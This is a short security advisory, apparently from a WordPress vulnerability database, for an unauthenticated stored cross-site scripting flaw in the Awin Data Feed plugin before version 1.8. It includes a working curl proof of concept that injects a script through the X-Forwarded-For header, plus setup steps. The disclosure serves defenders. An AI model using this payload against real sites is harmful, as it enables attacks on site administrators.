## WordPress Plugin Vulnerabilities

# Awin Data Feed < 1.8 - Unauthenticated Stored Cross-Site Scripting

### Description

The plugin does not sanitise and escape a header when processing request to generate analytics data, allowing unauthenticated users to perform Stored Cross-Site Scripting attacks against a logged in admin viewing the plugin's settings

### Proof of Concept

With a feed set in the plugin, open the URL, invoke the command below
curl 'https://example.com/wp-admin/admin-ajax.php' \
--data 'action=track\_user\_click&feedId=1' \
-H 'X-Forwarded-For: "><script>alert("xss");</script>'
The XSS will be triggered when an admin visits the plugin's settings (/wp-admin/admin.php?page=datafeed-settings)
Note: To set a feed, simply import the following CSV via the plugin:
categoryName,awDeepLink,merchantDeepLink,awImageUrl,description,productName,deliveryCost,currency,price
categoryName,awDeepLink,merchantDeepLink,awImageUrl,description,productName,deliveryCost,currency,price
